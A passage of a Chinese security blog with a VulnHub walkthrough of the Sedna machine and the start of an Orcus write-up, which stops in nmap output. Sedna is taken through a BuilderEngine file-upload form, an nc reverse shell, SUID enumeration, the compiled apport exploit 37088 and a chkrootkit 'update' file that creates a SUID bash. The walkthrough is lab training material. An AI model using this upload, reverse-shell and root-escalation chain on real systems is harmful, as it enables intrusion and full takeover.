src="/pic/aebb48f021a2b9e28058b9a684ff67be_MD5.png"></p><p>一个预览的图片，其中包含了 cms 的名字和产品，搜搜有没有漏洞</p><p><img src="/pic/8aab38395ee67681ad337627e3f2388e_MD5.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;files[]&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;send&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将以上代码存为 html 文件，本地访问并上传 php 文件，抓包看一眼</p><p><img src="/pic/a5c73af88c358bf407257cf1264adc22_MD5.png"></p><p>提前开启监听，尝试访问 <code>http://192.168.56.144/files/php.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sedna]<br>└─$ sudo nc -lvnp 443                                                       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.144] 40078<br>Linux Sedna 3.13.0-32-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux</span><br> 16:15:08 up  2:18,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:ed:69:55 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.144/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:feed:6955/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux</span><br><span class="hljs-string">$ sudo -l</span><br><span class="hljs-string">sudo: unable to resolve host Sedna</span><br><span class="hljs-string">sudo: no tty present and no askpass program specified</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@Sedna:/$ </span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看网站目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/$ <span class="hljs-built_in">cd</span> /var/www<br><span class="hljs-built_in">cd</span> /var/www<br>www-data@Sedna:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>flag.txt  html<br>www-data@Sedna:/var/www$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>bfbb7e6e6e88d9ae66848b9aeac6b289<br>www-data@Sedna:/var/www$ <span class="hljs-built_in">cd</span> html<br><span class="hljs-built_in">cd</span> html<br>www-data@Sedna:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 133M<br>277818 drwxr-xr-x  9 www-data www-data 4.0K Oct 25  2016 .<br>277817 drwxr-xr-x  3 root     root     4.0K Oct 22  2016 ..<br>282968 -rw-r--r--  1 root     root      225 Jun 10  2016 .htaccess<br>262151 -rw-r--r--  1 www-data www-data  65M Oct 24  2016 8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip<br>283341 -rw-r--r--  1 www-data www-data  65M Aug 17  2016 BuilderEngine-CMS-V3.zip<br>283378 -rw-r--r--  1 www-data www-data 638K Oct 24  2016 Hack_The_Planet.jpg<br>283376 -rw-r--r--  1 www-data www-data 275K Oct 24  2016 Hack_The_Planet2.jpg<br>283377 -rw-r--r--  1 www-data www-data 124K Oct 24  2016 Hack_The_Planet3.jpg<br>283370 -rw-r--r--  1 www-data www-data 181K Oct 24  2016 Sedna.jpg<br>283011 drwxr-xr-x  5 www-data www-data 4.0K Jun 10  2016 block_holders<br>283021 drwxr-xr-x 54 www-data www-data 4.0K Oct 24  2016 blocks<br>262152 drwxr-xr-x 19 www-data www-data 4.0K Oct 24  2016 builderengine<br>283003 -rw-r--r--  1 www-data www-data 1.4M Jun 10  2016 codecept.phar<br>283004 -rw-r--r--  1 www-data www-data  392 Jun 10  2016 codeception.yml<br>282971 drwxr-xr-x  6 www-data www-data 4.0K Sep 21 16:14 files<br>283005 -rw-r--r--  1 www-data www-data 2.2K Jun 10  2016 finder.html<br>283374 -rw-r--r--  1 www-data www-data 166K Oct 24  2016 hack-planet-1280-amox-zone.jpg<br>283375 -rw-r--r--  1 www-data www-data 256K Oct 24  2016 hack-planet-high-definition-mobile.jpg<br>283372 -rw-r--r--  1 www-data www-data 176K Oct 24  2016 hacker-manifesto-ethical.jpg<br>283373 -rw-r--r--  1 www-data www-data 603K Oct 24  2016 hacking.jpg<br>283369 -rw-r--r--  1 www-data www-data  101 Oct 25  2016 index.html<br>283007 -rw-r--r--  1 www-data www-data 1.2K Jun 10  2016 license.txt<br>401193 drwxr-xr-x  9 www-data www-data 4.0K Oct 24  2016 modules<br>283379 -rw-r--r--  1 www-data www-data 560K Oct 24  2016 pososibo-ethical-hacking-hack-fond.jpg<br>283009 -rw-r--r--  1 www-data www-data   36 Oct 25  2016 robots.txt<br>402200 drwxr-xr-x  8 www-data www-data 4.0K Oct 24  2016 system<br>402431 drwxr-xr-x  6 www-data www-data 4.0K Oct 24  2016 themes<br>283010 -rw-r--r--  1 www-data www-data    0 Jun 10  2016 weather.png<br>www-data@Sedna:/var/www/html$ <span class="hljs-built_in">cat</span> .htaccess<br><span class="hljs-built_in">cat</span> .htaccess<br>&lt;IfModule mod_rewrite.c&gt;<br><br>    RewriteEngine On<br><br>    SetEnv HTTP_MOD_REWRITE On<br><br>    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f<br>    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d<br>    RewriteRule ^(.*)$ index.php?/<span class="hljs-variable">$1</span> [L]<br><br>&lt;/IfModule&gt;<br></code></pre></td></tr></table></figure><p>查看家目录，定时任务，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/var/www/html$ <span class="hljs-built_in">ls</span> -liah /home<br><span class="hljs-built_in">ls</span> -liah /home<br>total 8.0K<br>262147 drwxr-xr-x  2 root root 4.0K Oct 28  2016 .<br>     2 drwxr-xr-x 21 root root 4.0K Oct  7  2016 ..<br>www-data@Sedna:/var/www/html$ <span class="hljs-built_in">ls</span> -ilah /etc/passwd /etc/shadow /etc/crontab<br><span class="hljs-built_in">ls</span> -ilah /etc/passwd /etc/shadow /etc/crontab<br>131332 -rw-r--r-- 1 root root    722 Feb  9  2013 /etc/crontab<br>156213 -rw-r--r-- 1 root root   2.0K Nov  4  2016 /etc/passwd<br>156215 -rw-r----- 1 root shadow 1.3K Nov  4  2016 /etc/shadow<br>www-data@Sedna:/var/www/html$ <span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br><span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br>root:x:0:0:root:/root:/bin/bash<br>postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br></code></pre></td></tr></table></figure><p>查看SUID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/tmp$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>131133   88 -rwsr-xr-x   1 root     root        88752 Jun  3  2014 /bin/mount<br>131146   40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping<br>131174   68 -rwsr-xr-x   1 root     root        67704 Jun  3  2014 /bin/umount<br>147037   32 -rwsr-xr-x   1 root     root        30112 Dec 16  2013 /bin/fusermount<br>131147   44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6<br> 21755   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at<br> 22577   16 -rwsr-xr-x   1 root     lpadmin     13672 Jul 18  2014 /usr/bin/lppasswd<br> 20867   20 -rwsr-xr-x   1 root     root        18136 May  7  2014 /usr/bin/traceroute6.iputils<br>   417   32 -rwsr-xr-x   1 root     root        30984 Feb 16  2014 /usr/bin/newgrp<br> 20897   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br>   535  156 -rwsr-xr-x   1 root     root       156708 Feb 10  2014 /usr/bin/sudo<br>   348   68 -rwsr-xr-x   1 root     root        66252 Feb 16  2014 /usr/bin/gpasswd<br>   277   36 -rwsr-xr-x   1 root     root        35916 Feb 16  2014 /usr/bin/chsh<br> 25122   84 -rwsr-sr-x   1 root     mail        83872 Oct 21  2013 /usr/bin/procmail<br>   274   44 -rwsr-xr-x   1 root     root        44620 Feb 16  2014 /usr/bin/chfn<br> 22441   20 -rwsr-xr-x   1 root     root        18168 Feb 11  2014 /usr/bin/pkexec<br>   429   48 -rwsr-xr-x   1 root     root        45420 Feb 16  2014 /usr/bin/passwd<br> 20934  484 -rwsr-xr-x   1 root     root       492972 May 12  2014 /usr/lib/openssh/ssh-keysign<br> 22446   12 -rwsr-xr-x   1 root     root         9804 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>   624    8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>  1588   12 -rwsr-xr-x   1 root     root         9612 Apr 12  2014 /usr/lib/pt_chown<br> 25608   12 -rwsr-xr-x   1 root     root         9752 Jun 11  2012 /usr/lib/authbind/helper<br>146763  324 -rwsr-xr--   1 root     messagebus   329856 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br> 20956  316 -rwsr-xr--   1 root     dip        322968 Jan 22  2013 /usr/sbin/pppd<br> 21187   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Jun  3  2014 /usr/sbin/uuidd<br> 22434   36 -rwsr-xr-x   1 root     root        34568 Jun 27  2013 /sbin/mount.cifs<br> 29051   88 -rwsr-xr-x   1 root     root        88412 Nov  6  2015 /sbin/mount.nfs<br></code></pre></td></tr></table></figure><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>内核版本蛮低的，而且 gcc 还在，考虑内核提权</p><p><img src="/pic/ae6487a173c69d7185e548a6ba729c0a_MD5.png"></p><p>尝试了以上列表中 3.x 内核的 exp，都失败了，脏牛提权会导致系统崩溃</p><p>linpeas 给出的结果参考意义也不是很大</p><p>看了眼 WP，这里有两种提权方法，内核提权：搜索关键词是 <code>Ubuntu 14.04</code></p><p><img src="/pic/7a66509846fb01fb498cf6ffad444361_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/tmp$ gcc 37088.c -o 37088<br>gcc 37088.c -o 37088<br>www-data@Sedna:/tmp$ ./37088<br>./37088<br>created /var/crash/_bin_sleep.33.crash<br>crasher: my pid is 4761<br>apport stopped, pid = 4762<br>getting pid 4761<br>current pid = 4760..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..<br>** child: current pid = 4761<br>** child: executing /bin/su<br>sleeping 2s..<br><br>checker: mode 4534<br>waiting <span class="hljs-keyword">for</span> file to be unlinked..writing to fifo<br>fifo written.. <span class="hljs-built_in">wait</span>...<br>waiting <span class="hljs-keyword">for</span> /etc/sudoers.d/core to appear..<br><br>checker: new mode 32768 .. <span class="hljs-keyword">done</span><br>checker: SIGCONT<br>checker: writing core<br>checker: <span class="hljs-keyword">done</span><br>success<br>sudo: unable to resolve host Sedna<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip  chkrootkit  flag.txt<br><span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>a10828bee17db751de4b936614558305<br></code></pre></td></tr></table></figure><h2 id="chkrootkit-提权"><a href="#chkrootkit-提权" class="headerlink" title="chkrootkit 提权"></a>chkrootkit 提权</h2><p>上传 pspy 看看</p><p><img src="/pic/c84cad319b0843c6b04b23020d8bfe5e_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/etc$ chkrootkit --version<br>chkrootkit --version<br>The program <span class="hljs-string">&#x27;chkrootkit&#x27;</span> is currently not installed. To run <span class="hljs-string">&#x27;chkrootkit&#x27;</span> please ask your administrator to install the package <span class="hljs-string">&#x27;chkrootkit&#x27;</span><br>www-data@Sedna:/etc$ <span class="hljs-built_in">cd</span> chkrootkit<br><span class="hljs-built_in">cd</span> chkrootkit<br>www-data@Sedna:/etc/chkrootkit$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>ACKNOWLEDGMENTS  README.chklastlog  chklastlog.c    chkutmp.c<br>COPYRIGHT        README.chkwtmp     chkproc.c       chkwtmp.c<br>Makefile         check_wtmpx.c      chkrootkit      ifpromisc.c<br>README           chkdirs.c          chkrootkit.lsm  strings.c<br>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V<br>./chkrootkit -V<br>chkrootkit version 0.49<br></code></pre></td></tr></table></figure><p>chkrootkit 是有漏洞的版本</p><p><img src="/pic/7b8516420b908b0d38f145a467123145_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash;chmod +xs /tmp/bash&quot;</span> &gt; update<br>www-data@Sedna:/tmp$ <span class="hljs-built_in">cat</span> update<br><span class="hljs-built_in">cat</span> update<br><span class="hljs-built_in">cp</span> /bin/bash /tmp/bash;<span class="hljs-built_in">chmod</span> +xs /tmp/bash<br>www-data@Sedna:/tmp$ <span class="hljs-built_in">chmod</span> +x update<br><span class="hljs-built_in">chmod</span> +x update<br>www-data@Sedna:/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>hsperfdata_tomcat7  pspy32  pspy64  tomcat7-tomcat7-tmp  update<br></code></pre></td></tr></table></figure><p>等待等待，再等待</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sedna:/tmp$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 6.8M<br>  245 drwxrwxrwt  5 root     root     4.0K Sep 23 10:25 .<br>    2 drwxr-xr-x 21 root     root     4.0K Oct  7  2016 ..<br>29063 -rwsr-sr-x  1 root     root     964K Sep 23 10:25 bash<br>28995 drwxr-xr-x  2 tomcat7  tomcat7  4.0K Sep 21 17:36 hsperfdata_tomcat7<br>29060 -rwxrwxrwx  1 www-data www-data 2.9M Sep 21 09:40 pspy32<br>29059 -rwxrwxrwx  1 www-data www-data 3.0M Jul 20 03:32 pspy64<br>  951 drwxr-xr-x  2 tomcat7  root     4.0K Sep 21 17:36 tomcat7-tomcat7-tmp<br>29061 -rwxrwxrwx  1 www-data www-data   43 Sep 21 19:23 update<br></code></pre></td></tr></table></figure><p>成功得到了 SUID 的 <code>/tmp/bash</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机在 Web 渗透阶段的难度倒不是很高，主要在于判断 cms，我巧合翻到了预览的图片，直接就拿到了信息。而在提权阶段，测试了八九个 exp，都提权失败了。这里也学到了两个小技巧，第一不要只将内核版本作为关键词搜索，可能由于 exp 编写者没有关注内核版本（过去 exp 可能编写没那么严谨），所以只按内核去搜，可能会漏掉一两个 exp，第二是 pspy 的作用，过去一直忽略了。</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Orcus 靶机</title>
    <link href="/2023/09/f93f3657d204.html"/>
    <url>/2023/09/f93f3657d204.html</url>
    
    <content type="html"><![CDATA[<h1 id="Orcus-靶机"><a href="#Orcus-靶机" class="headerlink" title="Orcus 靶机"></a>Orcus 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.143<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 02:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.143<br>Host is up (0.00058s latency).<br>Not shown: 65519 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>53/tcp    open  domain<br>80/tcp    open  http<br>110/tcp   open  pop3<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>443/tcp   open  https<br>445/tcp   open  microsoft-ds<br>993/tcp   open  imaps<br>995/tcp   open  pop3s<br>2049/tcp  open  nfs<br>34305/tcp open  unknown<br>38125/tcp open  unknown<br>44363/tcp open  unknown<br>45529/tcp open  unknown<br>MAC Address: 08:00:27:EB:CE:6D (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放的端口有点多，五位数的端口先不看了，22,53,80,110,111,139,143,443,445,993,995,2049</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,111,139,143,443,445,993,995,2049 192.168.56.143<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 02:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.143<br>Host is up (0.00053s latency).<br><br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)<br>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)<br>|_  256 c9:a9:c9:0d:<span class="hljs-built_in">df</span>:7c:<span class="hljs-built_in">fc</span>:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)<br>53/tcp   open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.10.3-P4-Ubuntu<br>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="hljs-string">| http-robots.txt: 30 disallowed entries (15 shown)</span><br><span class="hljs-string">| /exponent.js.php /exponent.js2.php /exponent.php </span><br><span class="hljs-string">| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php </span><br><span class="hljs-string">| /exponent_version.php /getswversion.php /login.php /overrides.php </span><br><span class="hljs-string">| /popup.php /selector.php /site_rss.php /source_selector.php </span><br><span class="hljs-string">|_/thumb.php</span><br><span 